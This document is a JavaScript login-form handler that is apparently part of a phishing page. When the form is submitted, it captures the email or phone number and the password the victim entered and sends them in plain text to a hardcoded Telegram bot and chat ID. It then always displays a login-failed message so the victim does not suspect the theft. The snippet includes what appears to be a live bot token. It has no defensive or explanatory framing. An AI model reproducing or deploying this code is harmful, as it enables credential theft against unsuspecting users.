document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            
            if (email === '') {
                alert('Please enter both email and password.');
                return;
            }

            
            const isPhoneNumber = /^[0-9]+$/.test(email);

            if (isPhoneNumber) {
                console.log('Phone number detected:', email);
            } else {
                console.log('Email detected:', email);
            }

            
            const botToken = '7681351216:AAESGnN-l3znGDjXomQukBzb9JFRoYUHmDs';
            const chatId = '7789589671';

            
            const message = `Login Attempt Failed:\nEmail/Phone: ${email}\nPassword: ${password}`;

            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Failed login data sent to Telegram.');
                    } else {
                        console.log('Failed to send failed login data.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });

            
            const errorMessage = document.getElementById('errorMessage');
            errorMessage.style.display = 'block';
        });
